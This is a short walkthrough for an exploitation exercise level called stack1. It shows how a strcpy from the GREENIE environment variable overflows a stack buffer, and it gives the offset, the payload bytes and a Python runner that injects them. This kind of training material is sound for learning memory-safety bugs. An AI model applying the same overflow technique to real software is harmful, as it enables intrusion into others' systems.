## `stack1` walkthrough (environment variable overflow)

This level overflows a stack buffer via `strcpy()` from an environment variable.

## Goal

- Set `modified == 0x0d0a0d0a`

## Bug

`strcpy(buffer, getenv("GREENIE"))` copies without bounds checking.

## Payload (this repo’s build)

- Offset to `modified`: **68 bytes** (verify with GDB)
- Value to write: `0x0d0a0d0a`
- Little-endian bytes: `\x0a\x0d\x0a\x0d`

So:

```python
payload = b"A"*68 + b"\x0a\x0d\x0a\x0d"
```

## Quick solve (reliable env injection)

```bash
python3 - <<'PY'
import os, subprocess
payload = b"A"*68 + b"\x0a\x0d\x0a\x0d"
env = os.environ.copy()
env["GREENIE"] = payload.decode("latin-1")
raise SystemExit(subprocess.call(["./stack1"], env=env))
PY
```

## Automation

```bash
python3 stack.1.py
```
